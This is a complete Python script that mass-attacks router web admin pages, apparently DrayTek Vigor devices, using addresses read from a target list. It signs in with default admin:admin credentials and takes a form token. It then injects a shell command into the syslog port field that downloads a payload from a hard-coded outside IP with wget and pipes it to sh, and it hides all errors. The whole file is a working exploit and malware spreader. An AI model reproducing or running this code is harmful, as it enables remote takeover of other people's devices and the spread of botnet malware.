import requests
import threading
from bs4 import BeautifulSoup
import urllib.parse

# Function to process each IP
def process_ip(ip_port):
    if ip_port.startswith('https://'):
        login_url = f'{ip_port}/adm/syslog_ml.asp'
        post_url = f'{ip_port}/goform/sys_mlSet'
        verify_ssl = False  # Ignore SSL certificate verification for HTTPS URLs
    else:
        login_url = f'http://{ip_port}/adm/syslog_ml.asp'
        post_url = f'http://{ip_port}/goform/sys_mlSet'
        verify_ssl = True

    headers = {
        'Cache-Control': 'max-age=0',
        'Authorization': 'Basic YWRtaW46YWRtaW4=',
        'Upgrade-Insecure-Requests': '1',
        'Origin': f'http://{ip_port}/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': f'http://{ip_port}/adm/syslog_ml.asp',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }

    timeout = 25  # Timeout value in seconds

    try:
        # Perform login to obtain AuthStr value
        login_response = requests.get(login_url, headers=headers, timeout=timeout, verify=verify_ssl)
        login_response.raise_for_status()  # Raise exception for HTTP errors
        
        soup = BeautifulSoup(login_response.text, 'html.parser')
        auth_str_input = soup.find('input', {'name': 'AuthStr'})
        if auth_str_input:
            auth_str_value = auth_str_input.get('value')
            
            # Construct data for the POST request
            post_data = {
                'SysEnable': 'on',
                'SysIP': '1.1.1.1',
                'SysPort': '514 --c`wget http://91.92.255.6/vi -O-|sh`',
                'SysLevel': '8',
                'MLSmtp': '',
                'MLSmtpPort': '',
                'MLMailto': '',
                'MLMailfrom': '',
                'MLUsr': '',
                'MLPwd': '',
                'MLTLS': 'on',
                'MLUsr_login': 'on',
                'AuthStr': auth_str_value
            }
            
            # Calculate Content-Length
            encoded_data = urllib.parse.urlencode(post_data)
            headers['Content-Length'] = str(len(encoded_data))
            
            # Send the POST request
            post_response = requests.post(post_url, headers=headers, data=post_data, timeout=timeout, verify=verify_ssl)
            post_response.raise_for_status()  # Raise exception for HTTP errors
            print(f"[VIGOR] payload sent to: {ip_port}")
            
    except:
        pass  # Suppress all exceptions


# Read IPs from ips.txt
with open('ips.txt', 'r') as file:
    ip_ports = [line.strip() for line in file]

# Create and start threads for each IP
threads = []
for ip_port in ip_ports:
    thread = threading.Thread(target=process_ip, args=(ip_port,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
